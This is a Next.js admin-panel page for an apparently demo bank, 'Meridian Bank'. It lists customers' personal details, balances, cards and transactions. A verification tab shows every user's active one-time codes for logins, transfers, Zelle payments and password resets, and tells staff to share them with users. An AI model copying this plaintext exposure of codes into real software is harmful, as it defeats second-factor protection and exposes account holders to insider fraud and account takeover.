'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';

export default function AdminPanel() {
  const [data, setData] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [tab, setTab] = useState('users');
  const [typeFilter, setTypeFilter] = useState('all');
  const [expandedUser, setExpandedUser] = useState<number | null>(null);
  const router = useRouter();

  const typeLabels: Record<string, string> = {
    login: 'Login',
    transfer: 'Transfer',
    internal_transfer: 'Internal Transfer',
    external_transfer: 'External Transfer',
    bill_pay: 'Bill Payment',
    card_lock: 'Card Lock/Unlock',
    card_cancel: 'Card Cancellation',
    password_reset: 'Password Reset',
    profile_edit: 'Profile Edit',
    security_change: 'Security Change',
    zelle_transfer: 'Zelle Payment',
  };

  useEffect(() => {
    fetch('/api/admin')
      .then(res => { if (!res.ok) throw new Error('Not authorized'); return res.json(); })
      .then(d => { setData(d); setLoading(false); })
      .catch(() => router.push('/admin/login'));
  }, [router]);

  if (loading) return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center font-sans">
      <div className="text-center">
        <div className="w-8 h-8 border-3 border-gray-300 border-t-navy-900 rounded-full animate-spin mx-auto mb-3" />
        <p className="text-sm text-gray-500">Loading admin panel...</p>
      </div>
    </div>
  );

  const fmt = (n: number) => new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(n);
  const fmtTime = (d: string) => new Date(d).toLocaleString('en-US', { month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit' });

  const filteredCodes = typeFilter === 'all'
    ? (data.verification_codes || [])
    : (data.verification_codes || []).filter((vc: any) => vc.type === typeFilter);

  return (
    <div className="min-h-screen bg-gray-100 font-sans">
      {/* Header */}
      <div className="bg-navy-900 text-white px-6 py-4 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 bg-cta-primary rounded-lg flex items-center justify-center font-bold text-sm">M</div>
          <div>
            <div className="text-base font-semibold">Meridian Bank</div>
            <div className="text-[10px] uppercase tracking-[1.5px] text-white/40">Admin Panel</div>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <Link href="/" className="text-xs text-white/60 hover:text-white no-underline">Website</Link>
          <button onClick={async () => { await fetch('/api/admin/logout', { method: 'POST' }); router.push('/admin/login'); }} className="text-xs text-white/60 hover:text-white bg-transparent border border-white/20 rounded-md px-3 py-1.5 cursor-pointer font-sans">Sign Out</button>
        </div>
      </div>

      <div className="max-w-[1100px] mx-auto px-6 py-6">
        {/* Stats */}
        <div className="grid grid-cols-3 gap-4 mb-6 max-md:grid-cols-1">
          {[
            { label: 'Total Users', value: data.stats.total_users },
            { label: 'Contact Submissions', value: data.stats.total_contacts },
            { label: 'Chat Messages', value: data.stats.total_chat_messages },
          ].map(s => (
            <div key={s.label} className="bg-white rounded-xl border border-gray-200 p-5">
              <div className="text-[11px] font-semibold text-gray-400 uppercase tracking-wider">{s.label}</div>
              <div className="text-[28px] font-bold text-gray-900 mt-1">{s.value}</div>
            </div>
          ))}
        </div>

        {/* Tabs */}
        <div className="flex gap-1 mb-5 bg-white rounded-lg border border-gray-200 p-1 w-fit">
          {['users', 'contacts', 'verification'].map(t => (
            <button key={t} onClick={() => setTab(t)} className={`px-4 py-2 text-xs font-semibold rounded-md cursor-pointer font-sans transition-all ${tab === t ? 'bg-navy-900 text-white' : 'bg-transparent text-gray-600 hover:bg-gray-50'}`}>
              {t === 'verification' ? 'Verification Codes' : t.charAt(0).toUpperCase() + t.slice(1)}
            </button>
          ))}
        </div>

        {/* Users Tab */}
        {tab === 'users' && (
          <div className="space-y-3">
            {data.users.map((u: any) => (
              <div key={u.id} className="bg-white rounded-xl border border-gray-200 overflow-hidden">
                <div onClick={() => setExpandedUser(expandedUser === u.id ? null : u.id)} className="flex items-center px-5 py-4 cursor-pointer hover:bg-gray-50/50 transition-all">
                  <div className="w-10 h-10 rounded-full bg-navy-900 text-white flex items-center justify-center text-xs font-bold shrink-0 mr-4">{u.name.split(' ').map((n: string) => n[0]).join('')}</div>
                  <div className="flex-1 min-w-0">
                    <div className="text-sm font-semibold text-gray-900">{u.name}</div>
                    <div className="text-xs text-gray-400">{u.email} · {u.member_id || 'No ID'}</div>
                  </div>
                  <div className="text-right mr-4 max-md:hidden">
                    <div className="text-sm font-semibold text-gray-900">{fmt(u.accounts?.reduce((s: number, a: any) => s + a.balance, 0) || 0)}</div>
                    <div className="text-xs text-gray-400">{u.accounts?.length || 0} accounts</div>
                  </div>
                  <svg viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" className={`w-4 h-4 shrink-0 transition-transform ${expandedUser === u.id ? 'rotate-180' : ''}`}><polyline points="6 9 12 15 18 9" /></svg>
                </div>

                {expandedUser === u.id && (
                  <div className="border-t border-gray-100 px-5 py-5 bg-gray-50/30">
                    {/* Personal Info */}
                    <div className="mb-5">
                      <div className="text-[11px] font-semibold text-gray-400 uppercase tracking-wider mb-2">Personal info</div>
                      <div className="grid grid-cols-3 gap-3 max-md:grid-cols-2 text-xs">
                        <div><span className="text-gray-400">Phone:</span> <span className="text-gray-700 font-medium">{u.phone || '—'}</span></div>
                        <div><span className="text-gray-400">DOB:</span> <span className="text-gray-700 font-medium">{u.dob ? new Date(u.dob).toLocaleDateString() : '—'}</span></div>
                        <div><span className="text-gray-400">SSN:</span> <span className="text-gray-700 font-medium">{u.ssn_last4 ? `***-**-${u.ssn_last4}` : '—'}</span></div>
                        <div className="col-span-2"><span className="text-gray-400">Address:</span> <span className="text-gray-700 font-medium">{u.address || '—'}</span></div>
                        <div><span className="text-gray-400">Last login:</span> <span className="text-gray-700 font-medium">{u.last_login ? fmtTime(u.last_login) : 'Never'}</span></div>
                      </div>
                    </div>

                    {/* Accounts */}
                    {u.accounts?.length > 0 && (
                      <div className="mb-5">
                        <div className="text-[11px] font-semibold text-gray-400 uppercase tracking-wider mb-2">Accounts</div>
                        <div className="grid grid-cols-2 gap-2 max-md:grid-cols-1">
                          {u.accounts.map((a: any) => (
                            <div key={a.id} className="bg-white rounded-lg border border-gray-200 p-3">
                              <div className="flex justify-between items-start">
                                <div>
                                  <div className="text-xs font-semibold text-gray-800">{a.name}</div>
                                  <div className="text-[10px] text-gray-400">{a.number} · {a.type}</div>
                                </div>
                                <span className={`text-[9px] font-semibold px-1.5 py-0.5 rounded-full ${a.status === 'active' ? 'bg-emerald-50 text-emerald-700' : 'bg-gray-100 text-gray-500'}`}>{a.status}</span>
                              </div>
                              <div className="text-lg font-bold text-gray-900 mt-1">{fmt(a.balance)}</div>
                              <div className="text-[10px] text-gray-400">Available: {fmt(a.available)}{a.apy ? ` · APY: ${a.apy}` : ''}</div>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* Cards */}
                    {u.cards?.length > 0 && (
                      <div className="mb-5">
                        <div className="text-[11px] font-semibold text-gray-400 uppercase tracking-wider mb-2">Cards</div>
                        <div className="grid grid-cols-3 gap-2 max-md:grid-cols-1">
                          {u.cards.map((c: any) => (
                            <div key={c.id} className="bg-white rounded-lg border border-gray-200 p-3">
                              <div className="text-xs font-semibold text-gray-800">{c.name}</div>
                              <div className="text-[10px] text-gray-400 mb-1">{c.number} · {c.type}</div>
                              {c.type === 'credit' && <div className="text-sm font-bold text-gray-900">{fmt(c.balance)} <span className="text-[10px] font-normal text-gray-400">/ {fmt(c.limit)}</span></div>}
                              <div className="flex items-center gap-2 mt-1">
                                <span className={`text-[9px] font-semibold px-1.5 py-0.5 rounded-full ${c.status === 'active' ? 'bg-emerald-50 text-emerald-700' : c.status === 'locked' ? 'bg-amber-50 text-amber-700' : 'bg-red-50 text-red-700'}`}>{c.status}</span>
                                {c.rewards && <span className="text-[10px] text-gray-400">{c.rewards}</span>}
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* Recent Transactions */}
                    {u.recent_transactions?.length > 0 && (
                      <div>
                        <div className="text-[11px] font-semibold text-gray-400 uppercase tracking-wider mb-2">Recent transactions</div>
                        <div className="bg-white rounded-lg border border-gray-200 overflow-hidden">
                          {u.recent_transactions.map((t: any) => (
                            <div key={t.id} className="flex items-center px-3 py-2 border-b border-gray-50 last:border-none text-xs">
                              <div className={`w-5 h-5 rounded flex items-center justify-center shrink-0 mr-2 ${t.type === 'credit' ? 'bg-emerald-50 text-emerald-600' : 'bg-red-50 text-red-500'}`}>
                                <span style={{ fontSize: '9px' }}>{t.type === 'credit' ? '+' : '−'}</span>
                              </div>
                              <div className="flex-1 min-w-0 truncate text-gray-700">{t.description}</div>
                              <div className="text-gray-400 mx-2 max-md:hidden">{t.category}</div>
                              <div className={`font-semibold shrink-0 ${t.type === 'credit' ? 'text-emerald-700' : 'text-gray-800'}`}>{fmt(t.amount)}</div>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            ))}
          </div>
        )}

        {/* Contacts Tab */}
        {tab === 'contacts' && (
          <div className="bg-white rounded-xl border border-gray-200 overflow-hidden">
            <div className="px-5 py-4 border-b border-gray-100">
              <div className="text-[15px] font-semibold text-gray-900">Contact Submissions</div>
            </div>
            {data.recent_contacts?.length > 0 ? data.recent_contacts.map((c: any) => (
              <div key={c.id} className="px-5 py-4 border-b border-gray-50">
                <div className="flex justify-between items-start mb-1">
                  <div className="text-sm font-medium text-gray-800">{c.first_name} {c.last_name}</div>
                  <div className="text-xs text-gray-400">{c.created_at ? fmtTime(c.created_at) : ''}</div>
                </div>
                <div className="text-xs text-gray-500 mb-1">{c.email} · {c.topic || 'General'}</div>
                <div className="text-sm text-gray-600">{c.message}</div>
              </div>
            )) : (
              <div className="px-5 py-8 text-center text-sm text-gray-400">No contact submissions yet.</div>
            )}
          </div>
        )}

        {/* Verification Codes Tab */}
        {tab === 'verification' && (
          <div className="bg-white rounded-xl border border-gray-200 overflow-hidden">
            <div className="px-5 py-4 border-b border-gray-100">
              <div className="text-[15px] font-semibold text-gray-900">Verification Codes</div>
              <div className="text-xs text-gray-400 mt-0.5">OTP codes generated for user actions. Share codes with users to authorize their requests.</div>
            </div>

            {/* Type filter */}
            <div className="px-5 py-3 border-b border-gray-100 flex gap-2 flex-wrap">
              {['all', 'login', 'internal_transfer', 'external_transfer', 'zelle_transfer', 'bill_pay', 'card_lock', 'card_cancel', 'password_reset', 'profile_edit', 'security_change'].map(f => (
                <button key={f} onClick={() => setTypeFilter(f)} className={`px-3 py-1.5 text-[11px] font-semibold rounded-full border cursor-pointer font-sans transition-all ${typeFilter === f ? 'bg-navy-900 text-white border-navy-900' : 'bg-white text-gray-500 border-gray-200 hover:bg-gray-50'}`}>
                  {f === 'all' ? 'All' : typeLabels[f] || f}
                </button>
              ))}
            </div>

            {filteredCodes.length > 0 ? (
              <div className="overflow-x-auto">
                <table className="w-full text-sm min-w-[700px]">
                  <thead>
                    <tr className="bg-gray-50 border-b border-gray-200">
                      <th className="text-left px-5 py-3 text-xs font-semibold text-gray-500 uppercase">User</th>
                      <th className="text-center px-5 py-3 text-xs font-semibold text-gray-500 uppercase">Code</th>
                      <th className="text-left px-5 py-3 text-xs font-semibold text-gray-500 uppercase">Purpose</th>
                      <th className="text-left px-5 py-3 text-xs font-semibold text-gray-500 uppercase">Details</th>
                      <th className="text-left px-5 py-3 text-xs font-semibold text-gray-500 uppercase">Status</th>
                      <th className="text-left px-5 py-3 text-xs font-semibold text-gray-500 uppercase">Created</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredCodes.map((vc: any) => {
                      const expired = new Date(vc.expires_at) < new Date();
                      const status = vc.used ? 'Used' : expired ? 'Expired' : 'Active';
                      const statusColor = vc.used ? 'text-gray-400 bg-gray-100' : expired ? 'text-red-600 bg-red-50' : 'text-emerald-700 bg-emerald-50';
                      const typeColor: Record<string, string> = {
                        login: 'text-blue-700 bg-blue-50',
                        transfer: 'text-purple-700 bg-purple-50',
                        internal_transfer: 'text-indigo-700 bg-indigo-50',
                        external_transfer: 'text-orange-700 bg-orange-50',
                        bill_pay: 'text-teal-700 bg-teal-50',
                        card_lock: 'text-amber-700 bg-amber-50',
                        card_cancel: 'text-red-700 bg-red-50',
                        password_reset: 'text-pink-700 bg-pink-50',
                        profile_edit: 'text-cyan-700 bg-cyan-50',
                        security_change: 'text-violet-700 bg-violet-50',
                        zelle_transfer: 'text-purple-700 bg-purple-50',
                      };
                      return (
                        <tr key={vc.id} className="border-b border-gray-50 hover:bg-gray-50/50">
                          <td className="px-5 py-3">
                            <div className="font-medium text-gray-800">{vc.user_name}</div>
                            <div className="text-[11px] text-gray-400">{vc.email}</div>
                          </td>
                          <td className="px-5 py-3 text-center">
                            <span className="font-mono text-lg font-bold text-navy-900 tracking-widest">{vc.code}</span>
                          </td>
                          <td className="px-5 py-3">
                            <span className={`text-[10px] font-semibold px-2.5 py-1 rounded-full ${typeColor[vc.type] || 'text-gray-600 bg-gray-100'}`}>{typeLabels[vc.type] || vc.type}</span>
                          </td>
                          <td className="px-5 py-3 text-xs text-gray-600 max-w-[220px]">{vc.details || '—'}</td>
                          <td className="px-5 py-3">
                            <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full ${statusColor}`}>{status}</span>
                          </td>
                          <td className="px-5 py-3 text-gray-400 text-xs">{fmtTime(vc.created_at)}</td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            ) : (
              <div className="px-5 py-8 text-center text-sm text-gray-400">No verification codes {typeFilter !== 'all' ? `for "${typeLabels[typeFilter] || typeFilter}"` : 'generated yet'}.</div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
